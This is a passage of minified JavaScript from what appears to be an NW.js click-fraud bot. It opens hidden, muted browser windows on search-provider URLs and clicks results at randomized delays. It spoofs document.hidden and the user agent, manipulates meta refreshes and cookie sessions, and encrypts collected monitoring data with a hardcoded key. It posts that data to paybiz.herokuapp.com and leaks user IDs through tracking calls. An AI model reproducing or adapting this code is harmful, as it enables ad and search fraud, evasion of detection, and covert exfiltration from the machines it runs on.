									else if (flowOutput && flowOutput.ans && !0 === flowOutput.ans.isInRedirecting) context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["flowOutput", "inRedirect"]), reportPageView("flowOutput/inred/" + flowOutput.ans.redirecter + "/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor);
									else {
										ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "noResults_roam_1"]);
										try {
											var smwUrl = "unknown";
											inputWindowContext.nwWindow && inputWindowContext.nwWindow.window && inputWindowContext.nwWindow.window.document && inputWindowContext.nwWindow.window.document.location && (smwUrl = inputWindowContext.nwWindow.window.document.location.href);
											var textToEncrypt = momo.getFinalUrl(context, context.kw) + " . " + smwUrl,
												encryptedUrl = CryptoJS.AES.encrypt(textToEncrypt, CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))).toString();
											reportPageView("error/flowOutput/no.res.roam/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + encryptedUrl, frisitor)
										} catch (e) {
											reportPageView("error/flowOutput/no.res.roam/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/unknown", frisitor)
										}
									}
									return inputWindowContext.nwWindow && inputWindowContext.nwWindow.window && inputWindowContext.nwWindow.window.document ? void(inputWindowContext.nwWindow.window.document.getElementsByTagName("a").length && (context.roamingFallbackUrl = inputWindowContext.nwWindow.window.location.href, context.roamFallback = global.setTimeout(roam, 1e3 * jen.FALLBACK_TIMEOUT_SECONDS, fallbackUnparsedPageRoamingActions, inputWindowContext), jen.FALLBACK_TIMEOUT_SECONDS = (2 * jen.FALLBACK_TIMEOUT_SECONDS - 2) / 2 ? (2 * jen.FALLBACK_TIMEOUT_SECONDS - 2) / 2 : 1)) : (reportPageView("error/flowOutput/no.res.smwnull/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "noResults_smwnull_2"]), void momo.tryCloseSmoothWnd(context))
								}
								var shouldGenerateUnclickedResult = !1;
								if (context && context.flowConfig && context.flowConfig.actions && context.flowConfig.actions.landingPageActions && context.flowConfig.actions.landingPageActions.click && context.flowConfig.actions.landingPageActions.click.forceUnclickedResult && void 0 !== context.flowConfig.actions.landingPageActions.click.forceUnclickedResult[context.resGroup]) {
									var generateUnclickedElementFactor = Math.floor(randomize(1, 100 * jen.resultPicker_generateUnclickedResult_percisionFactor));
									generateUnclickedElementFactor < context.flowConfig.actions.landingPageActions.click.forceUnclickedResult[context.resGroup] * jen.resultPicker_generateUnclickedResult_percisionFactor && (shouldGenerateUnclickedResult = !0)
								}
								if (context.chosenResIndex = jen.generateResults(kwl.res_cats[context.oddType].cats[context.resGroup]), resType.length <= 0 && flowOutput.nav.nextPage) context.chosenResIndex = -1;
								else {
									if (resType.length <= 0) return momo.tryCloseSmoothWnd(context), void ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "noResults_3"]);
									for (var amountOfClickedElements = momo.recorder.getAmountOfClickedElements(context, context.fosAmountPerformed, context.resGroup), i = 0; i < 100 && (!resType[context.chosenResIndex] && context.chosenResIndex > 0 || 1 == shouldGenerateUnclickedResult && amountOfClickedElements > 0 && amountOfClickedElements < resType.length && 1 == momo.recorder.isElementAlreadyClicked(context, context.fosAmountPerformed, context.resGroup, context.chosenResIndex)); i++) context.chosenResIndex = jen.generateResults(kwl.res_cats[context.oddType].cats[context.resGroup])
								}
								if (resType.length > 0 && context.chosenResIndex >= 0 && !resType[context.chosenResIndex]) return reportPageView("error/flowOutput/no.res/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "noResults_4"]), void momo.tryCloseSmoothWnd(context);
								for (var resultGroupName in context.catsAmounts.res = -1, context.catsAmounts.spo = -1, flowOutput) Array.isArray(flowOutput[resultGroupName]) && (context.catsAmounts[resultGroupName] = flowOutput[resultGroupName].length);
								context.refusedParsing = !1, reportPageView("flow/" + context.resGroup + "/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + (context.executionFlow ? context.executionFlow : "unknown") + "/" + getApplicationActionString() + "/" + context.oddType + "/r" + context.catsAmounts.res + "/s" + context.catsAmounts.spo + "/" + encLocalStorage.getItem("userid"), secFrisitor_PageViews), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["flowOutput", "nextClick", "group_" + context.resGroup, "oddType_" + context.oddType, "r_" + context.catsAmounts.res, "s_" + context.catsAmounts.spo]), ally.fillResultsText(context, inputWindowContext, flowOutput), ally.monitoringObj.fillQuery(context), ally.reportFreddie(context, inputWindowContext), proceedToLandingPageAction(landingPageActions, flowOutput, resType, context.chosenResIndex, inputWindowContext)
							} else if (ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["flowOutput", "res.reload"]), reportPageView("warn/res.reload/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), void 0 === context.prov.reload503Factor && (reportPageView("warn/incomp/reload503Factor/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.prov.reload503Factor = 70), Math.floor(randomize(1, 100)) <= context.prov.reload503Factor) {
								reportPageView("reload/chose/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["flowOutput", "reloadChose"]), inputWindowContext.nwWindow ? inputWindowContext.nwWindow.reload() : (context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "reloadWindow"]), reportPageView("error/flowOutput/no.res.rel.smwnull/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor));
								var resDelay = randomize(context.prov.resDelay.min, context.prov.resDelay.max);
								context.resRockTimeout && (global.clearTimeout(context.resRockTimeout), context.resRockTimeout = null), context.resRockTimeout = global.setTimeout(resRock, resDelay, inputWindowContext)
							} else reportPageView("reload/skipped/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)
						} else momo.tryCloseSmoothWnd(context)
				}

				function roam(e, t) {
					try {
						if (t.isResAvailable = !0, momo.overrideAllWnds(context), momo.muteAllWnds(context), !context.strongLock) {
							context.strongLock = !0, -1 != t.firstRoamingPage.historyIndex && "" != t.firstRoamingPage.url || (t.firstRoamingPage.historyIndex = t.nwWindow.window.history.length, t.firstRoamingPage.url = t.nwWindow.window.location.href);
							for (var o = e.close.act, n = jen.generateAction(e); e[n] && "function" == typeof e[n].canPlay && 0 == e[n].canPlay(t);) n = jen.generateAction(e);
							o = e[n].act;
							var r = 5,
								i = 30;
							void 0 !== e[n].timeBeforeRun && void 0 !== e[n].timeBeforeRun.start && void 0 !== e[n].timeBeforeRun.end && (r = e[n].timeBeforeRun.start, i = e[n].timeBeforeRun.end);
							var a = randomize(r, i);
							context.actionTime = global.setTimeout((function() {
								try {
									o(t), context.strongLock = !1
								} catch (e) {
									reportPageView("error/action/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), momo.tryCloseSmoothWnd(context)
								}
							}), 1e3 * a)
						}
					} catch (e) {
						reportPageView("error/roaming/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), momo.tryCloseSmoothWnd(context)
					}
				}

				function executeResRock(e) {
					if (null == e && (e = momo.tryGetWindowContext(momo.tryGetActiveWindow(context), context)), momo.overrideAllWnds(context), momo.muteAllWnds(context), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), context.actionTime && (global.clearTimeout(context.actionTime), context.actionTime = null), context.resRockTimeout && (global.clearTimeout(context.resRockTimeout), context.resRockTimeout = null), void 0 !== context && void 0 !== context.prov)
						if (devar.isUrlMatchingSomeRegex(e.nwWindow.window.document, context.flowConfig.exitPageRegexUrl) && 1 == context.flowConfig.waitForExitPage) global.setTimeout((function() {
							landingPageActions.close.act(e)
						}), randomize(4e3, 7e3));
						else {
							context.prov.resDelay && void 0 !== context.prov.resDelay.min && void 0 !== context.prov.resDelay.max || (reportPageView("warn/incomp/resDelay/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.prov.resDelay = {
								min: 2e3,
								max: 7e3
							});
							var t = randomize(context.prov.resDelay.min, context.prov.resDelay.max);
							context.resRockTimeout = global.setTimeout(resRock, t, e)
						}
					else momo.tryCloseSmoothWnd(context)
				}

				function loadedFuncStarter(e, t) {
					try {
						if (t.fallbackNotReloadingTimeout && (global.clearTimeout(t.fallbackNotReloadingTimeout), t.fallbackNotReloadingTimeout = null), momo.overrideAllWnds(t), momo.muteAllWnds(t), t.roamFallback && (global.clearTimeout(t.roamFallback), t.roamFallback = null, t.roamingFallbackUrl = null), e.nwWindow.window.location.href != e.oldLoc && e.isResAvailable && (e.oldLoc = e.nwWindow.window.location.href, e.phaser++), t && t.prov && t.prov.debug && 1 == t.prov.debug.logDomains) {
							var o = "unknown";
							e.nwWindow && e.nwWindow.window && e.nwWindow.window.document && e.nwWindow.window.document.location && (o = e.nwWindow.window.document.location.href), ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, t, ["win", "loaded", momo.getFinalUrl(t, t.kw), o, "query_" + t.fosAmountPerformed, "clicksPerformed_" + t.clicksPerformed, e.windowId])
						}
						"function" == typeof t.prov._canParse && 1 == t.prov._canParse(e.nwWindow.window.document) && (t.flowConfig.type && "seo" == t.flowConfig.type.toLowerCase() || null != devar.getSearchElement(kwl.domainsElementsClassNames, e.nwWindow.window.document)) || 2 == e.phaser && (!t.prov._canParse || "function" != typeof t.prov._canParse) ? (e.phaser = 2, executeResRock(e)) : (e.phaser >= 3 || "function" == typeof t.prov._canParse && 0 == t.prov._canParse(e.nwWindow.window.document)) && (e.phaser < 3 && (e.phaser = 3), roam(roamingActions, e))
					} catch (e) {
						ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.ERROR, t, ["smthwnd", "loaded", e.stack]), reportPageView("error/win.loaded/" + scriptVersion + "/" + getApplicationActionString() + "/" + momo.tryGetProviderId(t) + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), momo.tryCloseSmoothWnd(t)
					}
				}

				function wndStart(e) {
					var t, o, n = !1,
						r = {};
					context.smoothContext.nwWindow ? (r = momo.addRuggedWindow(e, context), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.wndStart && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["wndStart", "setup", "type_rugged"])) : ((r = context.smoothContext).nwWindow = e, n = !0, context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.wndStart && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["wndStart", "setup", "type_smooth"])), context.activeWindowContext = r, n && (momo.startExecutionTimeout(context), e.on("closed", (function() {
						ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["smthwnd", "closed"]), context.executionState = STATES.ENDED;
						try {
							global.clearTimeout(context.globalTimeout), context.globalTimeout = null, context.resRockTimeout && (global.clearTimeout(context.resRockTimeout), context.resRockTimeout = null), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null)
						} catch (e) {}
						try {
							ally.monitoringObj.fillUser(context), context.prov.debug && "boolean" == typeof context.prov.debug.shouldUseUserAgent && 1 != context.prov.debug.shouldUseUserAgent ? context.monitoringObject.user.ua.final_string = navigator.userAgent : context.monitoringObject.user.ua.final_string = newWindowOptions.user_agent;
							var e = JSON.stringify(context.monitoringObject),
								t = CryptoJS.AES.encrypt(e, CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))).toString();
							ajax.post("https://paybiz.herokuapp.com/diplg", void 0, void 0, void 0, encodeURIComponent(t)), ally.reportResultsTexts(context)
						} catch (e) {
							reportPageView("warn/mo/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
						}
						try {
							context.sessionContextOwner && context.sessionContextOwner.providersHolywoods && (context.sessionContextOwner.providersHolywoods[momo.tryGetProviderId(context)] || (context.sessionContextOwner.providersHolywoods[momo.tryGetProviderId(context)] = 0), context.sessionContextOwner.providersHolywoods[momo.tryGetProviderId(context)] += 1), reportEvent("holywood" + scriptVersion + (context.isFlowCookiefied ? ".CM" : "") + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context) + "." + (inputViolet && inputViolet.factor_id ? inputViolet.factor_id : "unknown") + "." + (context.executionFlow ? context.executionFlow : "unknown"), getApplicationActionString(), getUserId(), context.searchesAmount, frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "holywood", context.searchesAmount])
						} catch (e) {}
						try {
							slash.pushVioletExecution(context.prov.groupIds, sessionContext.kwl.provGroupsConfig)
						} catch (e) {}
						try {
							momo.clearWatchersIntervals(context), global.clearTimeout(context.actionTime), global.setTimeout(garbage, 0, 0), context.roamingFallbackUrl && global.clearTimeout(context.roamFallback), context.advanceTimeout || (context.advanceTimeout = global.setTimeout((function() {
								advance(!1, context)
							}), 3e5)), context.isFlowCookiefied ? CM.getCurrentSession((function(e) {
								CM.saveSession(momo.tryGetProviderId(context), e, (function(t) {
									CM.clearCurrentSession(e, (function(e) {
										CM.loadSession("root", (function(e, t) {
											CM.setCurrentSession(e, (function(e) {
												advance(!1, context), e && reportPageView("error/CM.setCurrentSession/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e, frisitor)
											})), t && reportPageView("error/CM.loadSession/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + t, frisitor)
										})), e || reportPageView("error/CM.clearCurrentSession/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)
									})), t && reportPageView("error/CM.saveSession/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + t, frisitor)
								})), e || reportPageView("error/CM.getCurrentSession3/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)
							})) : advance(!1, context)
						} catch (e) {
							reportPageView("error/win.close/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
						}
					}))), e.on("new-win-policy", (function(t, o, n) {
						ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["smthwnd", "new-win-policy"]);
						try {
							BOCompatible || n.forceCurrent()
						} catch (t) {
							reportPageView("error/win.policy/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + t.stack, frisitor), e.window.location.href = o
						}
					})), e.on("loading", (t = r, o = context, function() {
						ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, o, ["smthwnd", "loading"]), t.overrideInterval = global.setInterval((function() {
							try {
								momo.overrideAllWnds(o), momo.muteAllWnds(o)
							} catch (e) {
								reportPageView("error/smthwnd.loading/" + scriptVersion + "/" + getApplicationActionString() + "/" + momo.tryGetProviderId(o) + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), global.clearInterval(t.overrideInterval), t.overrideInterval = null
							}
						}), 1e3)
					})), e.on("loaded", function(e, t) {
						return function() {
							if (e.nwWindow && e.nwWindow.window && e.nwWindow.window.document) try {
								Object.defineProperty(e.nwWindow.window.document, "hidden", {
									get: function() {
										return !1
									},
									set: function(t) {
										e.nwWindow.window.document.hidden = t
									}
								})
							} catch (e) {
								return ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, t, ["smthwnd", "win.loaded", e.stack]), reportPageView("warn/win.loaded/def.hidden/" + momo.tryGetProviderId(t) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), void momo.tryCloseSmoothWnd(t)
							}
							if (e.actionsPerformed > 0 && (!t || !t.prov || !t.prov.debug || 1 == t.prov.debug.allowMetadataRefresh)) {
								var o = e.nwWindow.window.document.getElementsByTagName("meta");
								for (m = 0; m < o.length; m++) {
									var n = o[m].getAttribute("http-equiv");
									if (n && "refresh" == n.toLowerCase() && o[m].getAttribute("content") != e.nwWindow.window.document.location.href && (o[m].setAttribute("content", "1, url=" + e.nwWindow.window.document.referrer), nw.App.phaser -= 2, reportPageView("debug/meta/cont/" + scriptVersion + "/" + momo.tryGetProviderId(t) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), t && t.prov && t.prov.debug && 1 == t.prov.debug.logDomains)) {
										var r = "unknown";
										e.nwWindow && e.nwWindow.window && e.nwWindow.window.document && e.nwWindow.window.document.location && (r = e.nwWindow.window.document.location.href), ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, t, ["meta", "refresh", momo.getFinalUrl(t, t.kw), r, "query_" + t.fosAmountPerformed, "clicksPerformed_" + t.clicksPerformed, e.nwWindow.window.document.referrer])
									}
								}
							}
							momo.overrideAllFrames(t), momo.muteAllWnds(t);
							var i = e.nwWindow.window.document.getElementsByTagName("video"),
								c = e.nwWindow.window.document.getElementsByTagName("audio");
							for (v = 0; v < i.length; v++) i[v].setAttribute("muted", !0), i[v].pause();
							for (a = 0; a < c.length; a++) c[a].setAttribute("muted", !0), c[a].pause();
							e.nwWindow.window.nwDispatcher = null, global.setTimeout((function() {
								try {
									global.clearInterval(e.overrideInterval), e.overrideInterval = null
								} catch (e) {
									reportPageView("error/overrideclear/" + scriptVersion + "/" + momo.tryGetProviderId(t) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
								}
							}), 2e3), momo.recordUrl(e), loadedFuncStarter(e, t)
						}
					}(r, context))
				}

				function wndSetup() {
					if (context.executionState >= STATES.ON_WINDOW_SETUP) ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["executionState", "alreadyReached", STATES.ON_WINDOW_SETUP.toString()]);
					else {
						context.executionState = STATES.ON_WINDOW_SETUP;
						try {
							if (context.chosenFinalUrl = context.prov.url, "object" == typeof context.factorConfig && "string" == typeof context.factorConfig.url_override && "" != context.factorConfig.url_override && (context.chosenFinalUrl = context.factorConfig.url_override), context.flowConfig && context.flowConfig.url_override && (context.chosenFinalUrl = context.flowConfig.url_override), navigator.onLine && nw.Window.open) {
								document.activeElement;
								if (BOCompatible && context.prov.overrideFlags && (context.wndOverrideFlags = context.prov.overrideFlags), context.sessionContextOwner.providersRan += 1, chrome.cookies.getAll({}, (function(e) {})), context.searchesAmount += 1, context.executionState >= STATES.WINDOW_OPEN) return void ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["executionState", "alreadyReached", STATES.WINDOW_OPEN.toString()]);
								context.executionState = STATES.WINDOW_OPEN, newWindowOptions = momo.appendNW47WindowOptions(context, newWindowOptions);
								let e = momo.getFinalUrl(context, context.kw);
								context.monitoringObject.flow.callsToProviderUrl = context.monitoringObject.flow.callsToProviderUrl + 1, ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["smthwnd", "open", e]), nw.Window.open(e, newWindowOptions, wndStart)
							}
						} catch (e) {
							reportPageView("error/wndSetup/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
						}
					}
				}
			}

			function startInstance(e) {
				if (0 == momo.validateActiveSession(e, e.scriptContextOwner)) return reportPageView("warn/instance/not_active/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), void ally.reportSessionLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, e, ["finished_execution", "skipwood", 0, "not_active_session"]);
				slash.clearLeftoverViolets(e, (function(t, o, n) {
					t && parseInt(t) > 0 && reportEvent("VioClear_TTL", getApplicationActionString(), getUserId(), parseInt(t), frisitor), o && parseInt(o) > 0 && reportEvent("VioClear_GroupsCap", getApplicationActionString(), getUserId(), parseInt(o), frisitor), n && parseInt(n) > 0 && reportEvent("VioClear_StrategiesWBList", getApplicationActionString(), getUserId(), parseInt(n), frisitor), slash.getVioletsAmount(null, (function(t) {
						t < 1 && ally.reportRockNRollHolyEvent(e, "thai", e.providersRan), slash.pullViolet((function(t) {
							if (null != t) {
								var o = slash.violetToProvider(t, e);
								tryCatchConsole((function() {
									instance(o, e, t)
								}))
							}
						}))
					}))
				}))
			}

			function pushNewProviders(e, t, o) {
				if (e >= t.length) o();
				else {
					var n = t[e],
						r = slash.providerToViolets(n, sessionContext);
					slash.addViolets(r, (function() {
						pushNewProviders(e + 1, t, o)
					}))
				}
			}
		}
		spawnPing()
	}()
} catch (e) {
	if ("undefined" != typeof report && report.event) try {
		report.event("billy_fatal")
	} catch (e) {}
}